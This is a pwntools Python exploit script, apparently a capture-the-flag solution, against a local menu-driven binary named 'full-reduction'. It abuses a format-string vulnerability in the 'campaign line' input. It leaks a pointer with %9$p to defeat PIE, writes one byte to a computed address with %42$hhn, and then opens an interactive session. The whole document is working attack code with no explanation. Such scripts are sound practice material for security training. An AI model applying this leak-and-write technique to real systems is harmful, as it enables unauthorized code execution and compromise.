```python
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

p = remote("127.0.0.1", 61073)
# p = process('./full-reduction')
def menu(n):                          
    p.recvuntil(b'> ')
    p.sendline(str(n).encode())

def submit(data):                    
    menu(1)
    p.recvuntil(b'How long is this campaign line? ')
    p.sendline(str(len(data)).encode())
    p.recvuntil(b'Drop your campaign line here: ')
    p.send(data)

submit(b'%9$p.')
menu(2)
p.recvuntil(b'preview: ')
leak = int(p.recvuntil(b'.', drop=True), 16)
pie_base = leak - 0x1670

tgt = pie_base + 0x40b0
fmt = b'X' * 247
fmt += b'%42$hhn'
fmt += b'XX'
fmt += p64(tgt)
submit(fmt)
menu(2)

menu(3)
p.interactive()
```
